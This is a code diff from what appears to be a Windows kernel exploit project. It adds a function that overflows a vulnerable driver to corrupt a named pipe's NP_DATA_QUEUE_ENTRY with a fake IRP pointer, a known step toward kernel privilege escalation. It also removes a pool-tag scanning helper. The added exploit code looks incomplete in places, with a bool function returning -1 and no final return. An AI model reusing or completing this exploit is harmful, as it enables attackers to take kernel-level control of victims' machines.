@@ -2,20 +2,9 @@
 #include "Hvergelmir.h"
 #include "pipeManager.h"
 #include "config.h"
-// Simple helper to scan a buffer for an ASCII tag and return offsets
-static std::vector<UINT64> ScanForPoolTag(const BYTE* data, size_t size, const char* tag)
-{
-    std::vector<UINT64> offsets;
-    if (!data || !tag) return offsets;
-    size_t tagLen = strlen(tag);
-    if (tagLen == 0 || size < tagLen) return offsets;
-    for (size_t i = 0; i + tagLen <= size; ++i) {
-        if (memcmp(data + i, tag, tagLen) == 0) offsets.push_back((UINT64)i);
-    }
-    return offsets;
-}
 
-bool MemoryBroker::GetPipeLayout()
+
+bool MemoryBroker::GetThreadNameLayout()
 {
 
     bool correctLayout = false;
@@ -126,6 +115,37 @@ bool MemoryBroker::GetPipeLayout()
     return true;
 }
 
+
+
+bool MemoryBroker::CorruptThreadName()
+{
+    UINT64 fakeIRP = (UINT64)CreateFakeIRP();
+
+
+    // Corrupt the NP_DATA_QUEUE_ENTRY of the target pipe with an overflow from the driver
+    BYTE* payload = new BYTE[CHUNKSIZE + 0x10];
+    memset(payload, 'c', 0x10);
+    memcpy(payload + 0x10, leakedData + targetPipeOffset, CHUNKSIZE);
+    ((NP_DATA_QUEUE_ENTRY*)(payload + 0x20))->Irp = (IRP*)fakeIRP;
+    ((NP_DATA_QUEUE_ENTRY*)(payload + 0x20))->EntryType = 0x1;
+
+
+    printf(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
+    printf("     Payload:\n");
+    HexDumpLittleEndian(payload, 0x50);
+
+
+    UINT64 clientManager = *(UINT64*)(leakedData + targetPipeOffset + 0x10);
+
+    InvokeTriggerOverflow(payload, 0x50);
+
+
+    if (!pipeManager->VerifyCorruption())
+    {
+        printf(" [!] Failed to verify corruption\n");
+        return -1;
+    }
+}
 
 
 
